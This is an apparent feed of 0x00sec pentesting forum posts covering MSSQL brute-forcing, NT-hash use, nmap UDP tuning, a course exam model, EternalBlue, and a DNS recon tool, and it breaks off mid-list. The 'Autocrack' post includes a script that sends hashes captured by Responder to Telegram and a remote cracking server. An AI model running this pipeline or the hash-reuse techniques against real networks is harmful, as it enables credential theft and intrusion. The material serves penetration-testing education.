            <p>So I am hoping someone here can shed some light on this…</p>
<p>Apparently one is able to gain network access from bruting MSSQL instances.</p>
<p>So the first part of this (in my head at least), is you would need to do some form of port scanning (nmap / Shodan etc) and look for possible entry ways.  Once you have the required information, you can start brute forcing the SA account which is probably the most common account to use.</p>
<p>What I don’ t understand is how you can go from access to the DB (from the SA account) to network access?  I have done some looking around and the closest thing I can find are articles written up about SQLi to RCE.  Even CVE’ s for SQL that offer some form of code execution are few and far between.</p>
<p>How is this possible? Or am I misunderstanding the whole lot?</p>

          <title>What can one do with a user’s NTHASH?</title>
          <dc:creator><![CDATA[trier00]]></dc:creator>
          <category>Pentesting</category>
          <description><![CDATA[
            <p>I have a valid username, domain name and an NTHASH. I do not have the password. Have kept it for cracking and responder so far did not help (wpad is blocked by policy it seems, or default IE / win11/10 setting) but in the meantime is it possible for me to use the NTHASH and enumerate usernames, domain admins. I tried ‘cme’ and it gave me some users via rid bf and password policy - that’s it.</p>
<p>rpcclient , despite of providing the NTHASH asks for the password</p>
<p>smbclient does not play ball.</p>
<p>Any other options to use NTHASH?</p>
<p>Can I do anything with the original user’s system - they use MacOS though.</p>
<p>Furthermore, is it possible for me to use this with bloodhound and sense where the admins are logged into and where?</p>
<p>Apologies for asking too many questions.</p>
<p>I am picking up network testing after 9 years! Everything is different, but somethings are the same. Any help/lead would be appreciated.</p>
<p>Thank you.</p>

          <title>Routes for getting into Pentesting</title>
          <dc:creator><![CDATA[youngdryas]]></dc:creator>

            <p>Hi</p>
<p>First off, if this is in the wrong place or something, sorry, and do what you must :b</p>
<p>So, I have a question for people here who are currently, or have ever been working as a Penetration Tester, in any capacity, or anyone in the know I guess. I want to move into this area, but am a little lost as to which route I should take. My background is:</p>
<ul>
<li>I recently graduated from a CS degree.</li>
<li>I have no previous relevant work experience.</li>
<li>I have been mucking around with hacking on sites like HTB and such for years, but only in the last year have I done so with real focus(not just for fun), making a concerted effort to get better.</li>
<li>I have used Linux for many years and know my way around quite well I would say.</li>
<li>I have a good working knowledge of programming in general, particularly Python and Java.</li>
<li>Currently studying for Network+ cert</li>
<li>Going to go for the OSCP in the near future… well ASAP really.</li>
<li>Just to round this off, I will say I’m going through various privesc and other pentesting related courses too at the moment, as well as delving into web pentesting. Really trying to up my game in general.</li>
</ul>
<p>I know there are so many routes a person can take getting into pentesting/security in general. But I see before me, two probable courses. Either the IT route, starting on helpdesk, moving, hopefully before long, to a Network Admin type role, and perhaps Network Engineer, then pivot to pentesting. The other route, would be to get into a SOC as an analyst, and work my way from there. I would very much appreciate any thoughts on this. For instance, perhaps you think one would be better? Perhaps you would suggest something else entirely? Maybe you’d share your journey? Anything at all. Thanks for reading!</p>
<p>EDIT:</p>
<p>It seems blue team type jobs may be more numerous these days, and I definitely don’t want to discount that as a path. However, I imagine these require many of the same skills/knowledge/experience, and I think for someone at my level (level 0? experience-wise) that the routes into this may be the same right now.</p>

          <title>Autocrack - A Responder to Hashcat Queue with Notifications</title>
          <dc:creator><![CDATA[pry0cc]]></dc:creator>
          <category>Pentesting</category>
          <description><![CDATA[
            <p>Hello, 0x00ers!</p>
<p>In today’s article I’m going to be showing you how to set up something that allows you to automagically send hashes directly from Responder as soon as they’re captured.</p>
<p>Once a new NTLMv2 hash has been caught by Responder, the <code>notify.sh</code> script will poll the sqlite database that Responder stores its hashes in every 10 seconds. If it discovers a change, it will identify the new hash.</p>
<h1>Responder Client</h1>
<pre><code class="lang-auto">while true
do
	hashes=$(./UpHash.py | tr ' ' '\n')
	new_hash="$(echo $hashes | sha256sum)"

	if [[ "$new_hash" != "$last_hash"  ]]
	then
		for hash in $hashes
		do 
			if [[ ! $old_hashes =~ "$hash"  ]]
			then
				echo "we got a new hash! $new_hash"
				echo "HASH: $hash"
				short=$(echo $hash | cut -d ":" -f 1-4)
				curl -X POST -H 'Content-Type: application/json' -d "{\"chat_id\": \"$chat_id\", \"text\": \"Hash caught: $short :)\"}" https://api.telegram.org/bot$telegram_key/sendMessage
                curl -X POST --data "key=$hashcat_key&amp;hash=$hash" $url/submit &amp;
			fi
		done
	fi

	sleep 10
	last_hash="$new_hash"
	old_hashes="$hashes"
done
</code></pre>
<p>For this part to work, you need a Telegram bot and keys, I have written up how you can obtain this here:</p>

<p>ResponderNotify, get a telegram notification when you catch a new hash!  - pry0cc/ResponderNotify</p>

<h1>Hashcat Server</h1>
<p>Now, to the server. So it is absolutely possible that you can use something like Hastroplis, I’ve not looked into it very hard but I didn’t have an entire machine to wipe and use JUST for hacking.</p>
<p>So instead I just wrote a quick bash wrapper for Hashcat, it reads a new hash from a Linux named pipe I named <code>/tmp/hashpipe</code>. It will read each line that goes into the FIFO pipe, truncate the hash into a readable format, then store the original hash in a file, and then begin to crack it. The hashcat server script also has Telegram notifications, so if it cracks successfully, then you get a message, if it fails, it will let you know!</p>
<p>I’m really sorry about screenshots, but I’m on a sensitive engagement and so I can’t really share hash names (even if redacted) because it would be obvious.</p>
<p>This is the server:<br>

<h3><a href="https://github.com/pry0cc/autocrack" target="_blank" rel="noopener">pry0cc/autocrack</a></h3>

<p>autocrack adds queue support for hashcat cracking.  - pry0cc/autocrack</p>


  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p></p>
<p>When you start it with <code>./autocrack</code>, it will start a HTTP server on port <code>8182</code>. To very quickly enable this to be accessible over the internet, you can run <code>ngrok http 8182</code>, and it will automatically get you a public address with a valid certificate.</p>
<p>The webserver is ruby with sinatra, so you’ll need Ruby installed and you’ll need to run <code>bundle install</code> inside the autocrack directory.</p>
<p>You’ll also notice a master key is generated for the server, you’ll need to put this key into your <code>notify.sh</code> script from the ResponderNotify repo.</p>
<p>Once you have this all setup, it really makes those longer-term engagements a lot nicer and means that you don’t have to be glued to your responder window 24/7, you can just sit back and let it work its magic.</p>
<pre><code class="lang-auto">crack() {
    hash="$1"
    name="$2"
    mode="$3"
    outfile="cracked/$name"
    infile="hashes/$name"
    time_started=$(date +%D-%T)
    job="{\"job\":\"$name\",\"wordlist\":\"$wordlist\",\"rules\":\"$rules\",\"mode\":\"$mode\", \"time_started\":\"$time_started\"}"
    echo $job | jq &gt; status.json
    echo $job &gt;&gt; jobs_log.json

    echo $line &gt;&gt; $infile
    
    # You should load up your full list here
    echo "Starting hashcat..."
    hashcat -a 0 -m $mode $infile -o $outfile $wordlist -r $rules 
}

</code></pre>
<p>Reading through autocrack too, you may notice a serious lack of hashcat commands. This is just a PoC, and should definitely be modified to make your workflow better. If you want to open a pull request and make it better, please do so!</p>
<p>We could maybe add some modularity too so people can share their hashcat methodologies. Hmm.</p>
<h2>Ingest Functions</h2>
<p>I also wrote a few functions last night too, by sourcing the <code>functions.sh</code> file, you can run both:</p>
<pre><code class="lang-auto">source functions.sh
ingesthash "&lt;NTLMV2HASH&gt;"
ingesthashfile &lt;hashes.txt&gt;
</code></pre>
<p>Either ‘ingesting’ a list of hashes, or a single hash inside quotes.</p>
<h1>Conclusion</h1>
<p>In conclusion, setting up your own Responder -&gt; Hashcat pipeline is really easy, and if you have any trouble setting this up please message me on the 0x00sec Discord and I’ll try my best to help you out <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>Stay snapper 0x00ers!</p>

          <title>Speeding Up NMAP UDP Scans</title>
          <dc:creator><![CDATA[escollapse]]></dc:creator>
          <category>Pentesting</category>
          <description><![CDATA[
            <p>…when you learn something new - share it.  that everyone may benefit from your growth.</p>
<p>discovered this fun fact when i asked the internet for help in getting my nmap UDP scans to run faster.</p>
<p>Vanilla nmap UDP scan:<br>
sudo nmap -sU <em>target-ip</em></p>
<p>-sU:  UDP scan</p>
<p>Fast:<br>
sudo nmap -sU -T4 <em>target-ip</em><br>
or<br>
sudo nmap -sU -T5 <em>target-ip</em></p>
<p>-T:  adjust timing, 0=slowest, 5=fastest (default=3).  faster can miss ports</p>
<p>Faster:<br>
sudo nmap -sU -T5 --max-retries <em>max-tries</em> <em>target-ip</em></p>
<p>–max-retries <em>max-tries</em>:  limits probe re-transmissions to <em>max-tries</em></p>
<p>(not actually) Fasterer:<br>
sudo nmap -Pn -sU -T5 --max-retries <em>max-tries</em> <em>target-ip</em></p>
<p>-Pn:  skip host discovery.  I did not think I needed it, I was on the same network.  Why would I bother checking to see if the host is up?</p>
<p><strong>WRONG</strong></p>
<p>bonsaiviking is an nmap dev and said:<br>
“Remove -Pn. Seriously, it slows you way down because Nmap uses the host discovery phase to calibrate scan speeds. If it finds a good TCP probe that gets a response, it will use that to monitor network speed and responsiveness. Otherwise it has to use rate-limited ICMP responses.”<br>

<p>based on your nmap version, you can also (per bonsaiviking):<br>
“If you’re willing to give up some accuracy and miss some open ports, you can use --defeat-icmp-ratelimit to really speed up UDP scans.”</p>

          <title>SHELL-AFFECT - New Examination Model</title>
          <dc:creator><![CDATA[Cry0l1t3]]></dc:creator>
          <category>Pentesting</category>
          <description><![CDATA[
            <p>Hi, everybody,</p>
<p>It’s been a while since I posted something, so I’d like to pick it up a bit now.</p>
<p>Now that we will update the <a href="https://shell-affect.com/course/sab/" rel="nofollow noopener">course</a> next April and have already added almost 100 new pages of material, we have also revised and refined the certification process.<br>
In this topic, I would like to introduce you to the new examination model we have developed for <strong><a href="https://shell-affect.com" rel="nofollow noopener">SHELL-AFFECT</a></strong> certification process. This topic is structured as follows:</p>
<ul>
<li>1.0 The necessity and goals of the examinations.</li>
<li>2.0 The problems</li>
<li>3.0 New Examination Model</li>
<li>3.1 Goals of the Examination</li>
<li>3.2 Examination Phases</li>
<li>3.2.1 Course Material</li>
<li>3.2.2 Lab Environment</li>
<li>3.2.3 Live Presentation</li>
<li>3.2.4 HackTheBox Rank (Bonus)</li>
<li>4.0 Requirements for Passing</li>
</ul>
<hr>
<h1>1.0 The necessity and goals of the examinations</h1>
<p>Before we go into the model, we should take a look at what such an examination is necessary for.<br>
We know that such exams serve to determine the skills and the required level of knowledge.<br>
The skills and the required knowledge should be acquired through a course or workshop.</p>
<p>The learning material provided by the training provider should teach a particular repertoire so that the student can allow his/her creativity to solve problems that may arise.</p>
<p>Almost all exams have a time limit. Some give the student more time and others less. This is not only necessary for organizational reasons but also puts the student in a hard position to be able to quickly retrieve his or her knowledge when time pressure and effort are high. This way, the actual internalized processes, and skills are used, which the student should be able to apply intuitively.</p>
<p>Above all, the certificates obtained after such a passed examination should prove that the student has made a certain effort to pass it. Accordingly, this student has been able to prove to the certification body that he or she has acquired the required skills and knowledge in the examination environment provided by the training provider.</p>
<p>Especially in the area of penetration testing, the training providers try to check whether the student has developed a structured methodology for the given material.</p>
<p>So let us summarize what we have now:</p>
<ul>
<li>possesses the skills taught in the course or workshop</li>
<li>Has internalized the knowledge taught</li>
<li>The student can combine his knowledge with his creativity to solve problems under time pressure and in a given environment.</li>
<li>The student has achieved a high level of effort and performance</li>
<li>Material for the development of the methodology</li>
</ul>

<h1>2.0 The problems</h1>
<p>Regarding the required knowledge that a student is expected to achieve in a course or workshop, we found the problem that the exams too often focus on the performance of the short-term memory and therefore fail to test the actual skills, knowledge, and especially the understanding of the subject being studied.</p>
<p>Often such courses or workshops offer temporary learning environments or better said too short learning conditions for studying and practicing. Otherwise, students have to make a higher financial investment to “be allowed” to continue to practice. This fact puts the student in a situation where he or she has the material but cannot continue to practice to internalize the knowledge offered.</p>
<p>If a training provider offers learning materials and provides the student with the exam environment, they will dictate the student exactly how to proceed. The exam environment is based on the topics covered in the learning material. The student may be able to prove that he/she has solved one scenario or another, but only the problems of the specific topics are solved. If the environment differs from the known structure, the student is usually no longer able to solve the problem alone.</p>
<p>Obtaining a certificate may serve as a confirmation, but more than just the sheet of paper, the student cannot present anything more to the potential employer.</p>
<p>For the methodology, the examiners want to see that the student knows what he is doing and how. The development of such a methodology is not covered in the courses, which should help the student to develop its approach and methodology adapted to his strengths and weaknesses. This requires something that is not taught and is not even mentioned what it is to pay attention to. If we relate this to the point of creativity and say that the student must be able to do it himself, it is like an example when in an exam, the student is asked to build an engine he has never seen before.</p>
<p>Especially here, it is essential to learn not only to use tools for the identification of vulnerabilities but also to understand how these vulnerabilities can arise during configuration and administration. Instead, as penetration testers, we have to understand the tested environment better in a very short time than as administrators who took days, weeks, or even months for development.</p>
<p>In the end, the art is not to exploit the application, machine, or network but to find the way into it.</p>
<p>In summary, we see the following problems:</p>
<ul>
<li>No.1 mostly the performance of the short-term memory is queried</li>
<li>No.2 limited and cost-intensive practice environments to internalize the learning material</li>
<li>No.3 Based on the learning material, the student is given the path</li>
<li>No.4 The orientation for problem-solving is predefined</li>
<li>No.5 Passing the test only leaves only a certificate as proof of completion</li>
<li>No.6 No material or explanations are provided for the development of methodology but are required for the exam</li>
<li>No.7 Due to the limited and predetermined working environments, the creativity of the student is limited</li>
<li>No.8 The individual strengths and weaknesses of the student are not considered</li>
</ul>
<p>Some points have been omitted here, but these are the most important ones that should be clarified here.</p>

<h1>3.0 New Examination Model</h1>
<h3>3.1 Goals of the Examination</h3>
<p>The goal of the exam is to verify that the student has the theoretical knowledge and intermediate practical skills to test different types of systems for various vulnerabilities under high time pressure. Also, the student will be tested if he/she has developed a structured and logical methodology that allows him/her to creatively find ways to exploit the systems and their configurations for unauthorized access.</p>
<p>It should also be verified that the student has developed an understanding of how such vulnerabilities can occur in administration and configuration processes.<br>
The certification should not only be a proof of completion of the course, but rather a confirmation of long and intensive theoretical and practical study in the field of Penetration Testing / Ethical Hacking, which also makes it possible for the student to present his work to potential employers in the future.</p>
<p>Summary:</p>
<ol>
<li>Verify theoretical knowledge</li>
<li>Verify intermediate practical skills</li>
<li>Verify structured methodology</li>
<li>Verify understanding of how vulnerabilities can occur</li>
</ol>
<h3>3.2 Examination Phases</h3>
<p>The certification process is divided into 4 phases. A maximum of <strong>100 points</strong> can be collected. To pass the exam, the student has to collect at least <strong>80 points</strong> .</p>
<p><strong>Examination</strong> <strong>phases:</strong></p>
<ol>
<li>Course Material - Exercises</li>
<li>Lab Development</li>
<li>Live Presentation</li>
<li>Rank (Bonus)</li>
</ol>
<h3>3.2.1 Course Material</h3>
<p>In the first phase, the student deals with the course material. Here the student gets <strong>0.5 points</strong> for each solved exercise.</p>
<p>Actually, there are <strong>77 evaluated exercises</strong> in total. This means that the student can earn a maximum of <strong>38.5 points</strong>, but the point limit for this part is fixed at a maximum of <strong>30 points</strong> . Exercises marked as “<strong>not required</strong>” are not evaluated.</p>
<p>This gives the student the flexibility to fulfill its abilities according to his own preferences and needs. Also, this solution provides the student with the possibility to skip 17 tasks and still achieve the full score.</p>
<ul>
<li>
<p>Each exercise that takes the activity of the student in the form of testing or configuration requires at least <strong>one</strong> screenshot.</p>
</li>
<li>
<p>Students ID/Username must be visible in all screenshots.</p>
</li>
</ul>
<p>This can be the username or a comment in the working environment. If no screenshot was taken for an exercise or the ID/Username is not visible in the screenshot, the exercise will be evaluated with <strong>0 points</strong>. Each exercise <strong>must</strong> be clearly and unambiguously documented.</p>
<p><strong>Solution for problem No. 3:</strong></p>
<ul>
<li>The learning material and the exercises do not prescribe a way for the student to use.</li>
</ul>
<p><strong>Solution for problem No.4:</strong></p>
<ul>
<li>When working through the course material, the exercises do not tell the student how to solve them. The student will come across problems and situations that can be individual due to the different approaches and require the student to review and analyze his/her own approach to find his/her mistakes.</li>
</ul>
<p><strong>Solution for problem No.6:</strong></p>
<ul>
<li>The course itself contains over 20 pages of material that deals only with the learning process, strengths, weaknesses, ways of learning, and the development of a methodology with many assisting elements.</li>
</ul>
<p><strong>Solution for problem No.8:</strong></p>
<ul>
<li>The student himself decides, according to his/her own strengths and weaknesses, how to solve the exercises. The student can skip some of the exercises and still get the full score for this phase. After all, we do not have to and cannot know everything. Therefore it is advantageous to use our strengths and minimize our weaknesses.</li>
</ul>
<h3>3.2.2 Lab Environment</h3>
<p>During the course, the student starts to create a locally hosted vulnerable network that simulates a realistic scenario where the student performs a full penetration test.</p>
<p>This phase requires the creation of configuration documentation and a penetration testing report that explains step-by-step all changes and activities performed by the student.</p>
<p>These two documentations, in addition to the documentation for the exercises, must be made accessible to the examiner in a password-protected ZIP archive at least 5 days before the presentation date.</p>
<p>For the exam, he/she needs to set up and configure <strong>5</strong> vulnerable VMs, which are vulnerable in different ways. This means that only one vulnerability of e.g., RCE/LFI/RFI/XSS/SQLi or vulnerable application may be present in the entire configuration of the vulnerable Lab environment. The Lab must also contain at least one Linux and Windows-based operating system.</p>
<p>The point allocation depends on the proximity to reality and complexity. The student can achieve a maximum of <strong>7 points</strong> per VM. This results in a total score of 35 points. For this category, a point limit of <strong>25 points</strong> has been set.</p>
<p><strong>Solution for problem no. 5:</strong></p>
<ul>
<li>In this phase, the student not only deals with each service and its configuration but also gets insight from an administrator’s perspective, which gives the student an understanding of the respective services, what information they work with and how vulnerabilities in the configurations can occur. The student will create two documentations that describe the configuration and its exploitation in detail. These documentations can later be presented to the potential employers as already performed performance in addition to the certificate, which in turn increases the chances for a commitment.</li>
</ul>
<h3>3.2.3 Live Presentation</h3>
<p>The most important aspect of certification is its appreciation, which comes with the work done by the student. It is intended to confirm that the student has the appropriate knowledge and skills required for this. This is technical knowledge and practical skills, especially the confirmation of the development and use of their methodology.</p>
<p>Besides that, an essential skill that has to be verified is that the student has a structured methodology to approach scenarios and solve problems and find the way into the machine.</p>
<p>After the live session is established, the <strong>“Creativity Of Problem Solving” - scripts (COPS-Scripts)</strong> scripts come into play.<br>
The COPS Scripts are small scripts created by the examiners based on the documentations provided by the students, which modify the Lab environment. These changes force the student to take specific steps necessary to find the path to the vulnerability. Additionally, these COPS scripts generate the <strong>user.txt</strong> and <strong>root.txt</strong> files with the appropriate hash values that the student must get. Also, these scripts change the <strong>passwords</strong> of the User and root/Administrator.</p>
<p>Such a lab will often be different, and the COPS scripts reduce the chances that the same environment will be used for the exams. This, in turn, prevents the exam from being leaked.</p>
<p>The student gets informed just during the presentation, which VMs will be changed by the COPS-Scripts and should be tested again.</p>
<p>In this phase, the practical skills, as well as the methodology and approach, are explicitly tested, as the student operates in a well-known environment to find the vulnerabilities.</p>
<h3>3.2.4 HTB Rank (Bonus)</h3>
<p>Since the student has the opportunity to practice for 1 year as a VIP on the HackTheBox Platform with over 140 VMs, he also can earn bonus points based on his rank.<br>
A maximum of 10 points can be earned here.<br>
With the rank “Script Kiddie”, the student receives <strong>5 points</strong>.<br>
If he reaches the rank “Hacker”, another <strong>5 points</strong> will be awarded to the student for the exam.</p>
<p>A total of 10 points can be earned in this phase.</p>
<p><strong>Solution for problem no. 1, 2, and 7:</strong></p>
<ul>
<li>Since the course is designed based on the HackTheBox Platform and the student can also get VIP status for cheap to get access to over 140 VMs with the course, it gives the student 1 year time to train and internalize his/her knowledge and skills.</li>
</ul>
<h3>4.0 Requirements for Passing</h3>
<p>To be able to check the theoretical part, the student has to take an exam in which he/she creates services, configures them, and understands how they work and learns to understand how already found vulnerabilities could occur.</p>
<p>Another critical factor is that the student should not be given a path to use. It should be possible for the student to encourage their creativity and to extend their strengths in the best possible way and to improve their weaknesses as far as possible. These areas are covered by the first (1. Course Material - Exercises) and the second (2. Lab Development) phase.</p>
<p>The practical part is about the realization of theoretical knowledge and a logical and structured methodology and approach. To verify these skills and to further enhance the strengths and weaknesses of the student, the skills are tested in his/her local Lab and under high time pressure. An examiner must supervise and evaluate the student’s approach through a <strong>60</strong> <strong>minutes</strong> screen sharing session (3. Presentation).</p>
<p>This process uses the so-called <strong>“Creativity Of Problem Solving” - Scripts</strong> (COPS-Scripts), which change the student’s local Lab and make him/her take specific steps to find the way to the configurations or weaknesses.</p>
<p>As a bonus, the student can earn additional points with the practical area if he/she reaches specific ranks (4. Rank).</p>
<p><strong>Summary:</strong></p>
<ol>
<li>Development and configuration experience</li>
<li>Creative thinking</li>
<li>Fast and smart learning methodology</li>
<li>Practical realization of the theory</li>
<li>Working under high time pressure</li>
<li>Attention to detail to solve problems</li>
</ol>

            <p>Hey guys, i decided to make a video on windows 7 and why its time to switch to a different operating system.</p>
<p>Youtube link: <a href="https://www.youtube.com/watch?v=DssXr5gjD84&amp;t=24s" rel="nofollow noopener">https://www.youtube.com/watch?v=DssXr5gjD84&amp;t=24s</a></p>
<p>Windows 7 End of LIfe:</p>
<p>Microsoft made a commitment to provide 10 years of product support for Windows 7 when it was released on October 22, 2009. This 10-year period has now ended, and Microsoft has discontinued Windows 7 support so that we can focus our investment on supporting newer technologies and great new experiences. The specific end of support day for Windows 7 was January 14, 2020. Technical assistance and software updates from Windows Update that help protect your PC are no longer available for the product. Microsoft strongly recommends that you move to Windows 10 to avoid a situation where you need service or support that is no longer available.</p>

<p>Eternal Blue:<br>
This module is a port of the Equation Group ETERNALBLUE exploit, part of the FuzzBunch toolkit released by Shadow Brokers. There is a buffer overflow memmove operation in Srv!SrvOs2FeaToNt. The size is calculated in Srv!SrvOs2FeaListSizeToNt, with mathematical error where a DWORD is subtracted into a WORD. The kernel pool is groomed so that overflow is well laid-out to overwrite an SMBv1 buffer. Actual RIP hijack is later completed in srvnet!SrvNetWskReceiveComplete. This exploit, like the original may not trigger 100% of the time, and should be run continuously until triggered. It seems like the pool will get hot streaks and need a cool down period before the shells rain in again. The module will attempt to use Anonymous login, by default, to authenticate to perform the exploit. If the user supplies credentials in the SMBUser, SMBPass, and SMBDomain options it will use those instead. On some systems, this module may cause system instability and crashes, such as a BSOD or a reboot. This may be more likely with some payloads.</p>

<p>Bluekeep :<br>
This is the type of vulnerability that malicious cyber actors frequently exploit through the use of software code that specifically targets the vulnerability. For example, the vulnerability could be exploited to conduct denial of service attacks. It is likely only a matter of time before remote exploitation code is widely available for this vulnerability. NSA is concerned that malicious cyber actors will use the vulnerability in ransomware and exploit kits containing other known exploits, increasing capabilities against other unpatched systems.</p>

<li>All <strong>Dns records</strong>!</li>
<li>Is <strong>non-intrusive</strong> - leave <strong>NO fingerprints</strong>, <em>totally fast and totally anonymous.</em>
</li>
</ul>
<p><strong>SubZone</strong> - Gathers all registered subdomains for target domain, and then checks too see which ones are active subdomains,<br>
also will go through dns servers and do zonetransfer to see if any server have been miss configured and are leaking valuable<br>
information.</p>
<ul>
<li>Owner/sys-admin email.</li>
<li>Owner contact info.</li>
<li>Server contact info.</li>
<li>Ip addresses.</li>

<em>(Check out dns record pics for <a href="http://zonetransfer.me" rel="noopener nofollow ugc">zonetransfer.me</a> at bottom of page for example)</em>
</li>
</ul>
<p>This helps penetration testers and bug hunters collect and gather subdomains and information for the domain they are targeting.</p>
<h2>Getting Started</h2>
<p>Either Fork the latest repository or use pip to get latest version of subzone.<br>
For easy install of python package and all dependencies use - <em>pip install subzone</em></p>
<p><strong>Key points</strong></p>
<ul>
<li>Arguments are <strong>-d</strong> <em>(For domain)</em> &amp; <strong>-o</strong> <em>(For output file)</em>
</li>
<li>Use http(s) in your domain.  ~  <em>Ex. -d <a href="https://example.com" rel="noopener nofollow ugc">https://example.com</a> (Not <a href="https://www.example.com" rel="noopener nofollow ugc">https://www.example.com</a>)</em>
</li>
<li>Specifying domain name is <em>NOT</em> optional.  ~  <em>Ex. -d <a href="https://example.com" rel="noopener nofollow ugc">https://example.com</a></em>
</li>
<li>Specifying output file <em>is</em> optional.  ~  <em>Ex. -o example.txt</em>
</li>
</ul>
<p><strong>Can also be used as an import to your own script/program</strong><br>
<em>from subdomain import subzone</em><br>
then use <strong>subzone.get(url)</strong> eg. subzone.get(‘<a href="https://facebook.com" rel="noopener nofollow ugc">https://facebook.com</a>’)<br>
Will print out a list of registered domains and active domains - in color -</p>
<p><strong>Example Usage:</strong></p>
<pre><code class="lang-auto">-d (domain) is True(needed)  -o (output) is True (needed) - 
- python subzone_v2.0.py -d (domain) -o (output)
- python subzone_v2.0.py -d https://facebook.com -o facebook.txt
- python subzone_v2.0.py -d https://zonetransfer.me -o zonetransfer.txt
</code></pre>
<ul>
<li>
<em>100%</em>: You will get everything that can be possibly got from the domain/host all whilst leaving <strong>NO</strong> fingerprints.</li>
</ul>
<h3>Prerequisites</h3>
<p><strong>Python</strong> - This is built on Python 3.6, you will need at least Python 3.5+ (might work with 3+ i haven’t tested it - should not be hard to make work tho if doesn’t!) to use this software. - <a href="https://www.python.org/" rel="noopener nofollow ugc">https://www.python.org/</a></p>

            <p>I came across this in the sponsored section for the <a href="https://ctftime.org/event/926" rel="nofollow noopener">upcoming xmas CTF</a>.<br>
It’s a breed between HTB and a walkthrough, splitting difficult tasks up into byte sized chunks. If you get stuck at one bit, it usually has a very descriptive task or a good hint that allows you to research into the subject and then continue on. Definitely a more linear path but a great learning experience in my opinion.<br>
I’ve learned a lot from the small amount of time I’ve spent on there so I thought I’d share the link with all of you guys and see what you guys think about it.</p>
<p><a href="https://tryhackme.com/" rel="nofollow noopener">https://tryhackme.com/</a></p>
<p>Plus, if you get stuck on a challenge and can’t find the solution, you can ask for help in their discord channel and usually you receive it in a very short amount of time, definitely a great community for beginners who want to get into pentesting.</p>

            <p><a href="https://shell-affect.com" rel="nofollow noopener"><img src="//0x00sec.s3.dualstack.us-east-1.amazonaws.com/original/2X/6/6af7cfa61d8f18b230599afd7157bb84820e5c3f.jpeg" alt="grafik" data-base62-sha1="fghxM3Y66J0sNimHusKWj5LciWX" width="586" height="500"></a></p>
<p>Hey, guys, how are you all doing together?</p>
<p>It’s been a long time since you’ve heard anything from me. That was because I was in the development of the new project and put all my time and attention into it.</p>
<p>Throughout my time in the community, I have noticed that newcomers have difficulty finding their way into the field of information security, and experienced and advanced people have their problems improving and perfecting their methodologies.</p>
<p>During my weeks of research, I looked for sources of information that would teach you to develop and perfect your methodology, adapted to the material of information security, and offensive cybersecurity. A course or a source that teaches and shows this to every interested person. After all, there must be some source that can cover the whole field. I knew that it was possible for me because I saw a clear structure for myself and the possibility to teach all the interested people precisely that.</p>
<p>Unfortunately, I had to realize that there is no source yet that teaches it in that way, as I imagined and thought. None of them has applied this structure and the teaching method that I have developed and applied for myself.</p>
<p>After lengthy deliberations and exchanges with others, I decided to realize the whole thing myself. I found a way not only to bring the structure onto the paper in a clear way but also to communicate it to people so that they understand it. I called this course <strong><a href="https://shell-affect.com/" rel="nofollow noopener">SHELL-AFFECT - BASELINE</a></strong>. After many modifications and tests, I have found a way to structure this course in a way that makes it inevitable to miss all the essential parts of knowledge and the development of one’s methodology and perfection.</p>
<p>This is the first feedback I have received from the students who tested this course:</p>
<p>Test Student Nr. 1:</p>
<blockquote>
<p><em>SHELL-AFFECT - BASELINE is a unique, informative and professionally made the course for hackers in all stages of their Cyber Security journey. The content is thoroughly thought out, well designed, and superbly organized. I have never been able to say the same for any course in Cyber Security, this course is certainly something special.</em> - Twitter: <a href="https://twitter.com/SecGus" rel="nofollow noopener">@SecGus</a> (OSCP)</p>
</blockquote>
<p>Test Student Nr. 2:</p>
<blockquote>
<p><em>I have learned a lot about different ways to manage workload and taking a different perspective on solving problems. The most interesting part about this course so far has been the way he explains what thinking outside the box is and how problems only become problems. With the time I have been able to spend with this course so far, I have found the different ways of thinking most interesting, and it gave me a new perspective on solving “problems”. I can’t wait to continue diving deeper into this course.</em> - Anonymous</p>
</blockquote>
<p>Test Student Nr. 3:</p>
<blockquote>
<p><em>My favorite part has been the exercise with thinking outside of the box and how something is only a problem when you bring emotion into it.<br>
Like Woah, that’s good! Also, the part about having goals is cool as well.<br>
Knowing what you are working towards helps definitely a different mindset than what I am used to and I like the new perspective that it has given me.</em> - Anonymous</p>
</blockquote>
<p>I thank you for the time you invested in the course and for the great feedback!</p>
<p>In cooperation with the <a href="https://0x00sec.org">0x00sec Community</a> and <a href="https://www.hackthebox.eu" rel="nofollow noopener">HackTheBox</a>, we have created a course that will teach you all the things you need for your hobby or career in information security in no time at all.<br>
The most important thing is that you learn to develop and perfect your methodology, adapted to your strengths and weaknesses.<br>
Within the course you will work with the following topics:</p>
<ul>
<li>Linux (Ubuntu, Kali, Debian)</li>
<li>Windows (XP up to Windows Server 2019)</li>
<li>Web server (Apache, Python, IIS)</li>
<li>Databases (MySQL, PostgreSQL, MSSQL)</li>
<li>Domain Name Systems (DNS)</li>
<li>Mail Services (POP3, IMAP, SMTP)</li>
<li>Manipulation of Network Traffic</li>
<li><strong>OSI Model &amp; TCP/IP in practice</strong></li>
<li>Penetration Testing Execution Standard (PTES)</li>
<li>Open Source Security Testing Methodology Manual (OSSTMM)</li>
<li><strong>Full OWASP Top 10 in practice</strong></li>
<li>GNU Debugger (GDB)</li>
</ul>
<p>and many more.</p>
<p>Here you can have a look at and download the <a href="https://shell-affect.com/syllabus/Syllabus.pdf" rel="nofollow noopener">Syllabus</a>.</p>
<p>To offer the best possible quality and to create a practice environment that gives the student enough time to become familiar with the respective topics, the course includes one year VIP access to the HackTheBox platform where you have over 130 different VMs which you can use to practice.</p>
<p>You also have the opportunity to be certified after this course. The certification method is also unique and has been structured so that the student’s knowledge is tested to the highest standards. The certification is separated into four phases:</p>
<h3><strong>Phase 1 – Course material</strong></h3>
<p>The first phase deals with the course material.<br>
During the study, the student has to complete exercises that earn them points.<br>
To achieve the full score of 30 points in this phase, the student must complete at least <strong>60 exercises</strong> .<br>
These tasks require creativity for problem-solving and a <strong>strong</strong> personal commitment.</p>
<h3><strong>Phase 2 – Lab Environment</strong></h3>
<p>In this phase, the student can collect a maximum of 40 points.<br>
The next step for the student is to build their local network environment on which they perform a full penetration test.<br>
The student gets <strong>5 points</strong> for only one access with the privileges of a user and another <strong>5 points</strong> for only one access with privileges of an administrator for each system.</p>
<h3><strong>Phase 3 – Live Presentation</strong></h3>
<p>Once the Lab Environment has been set up, and the reports have been written, the student must demonstrate the full penetration test <strong>live</strong> in a <strong>60-minute presentation</strong> via the screen-sharing session.<br>
During the presentation, the points will be awarded according to three criteria:</p>
<ol>
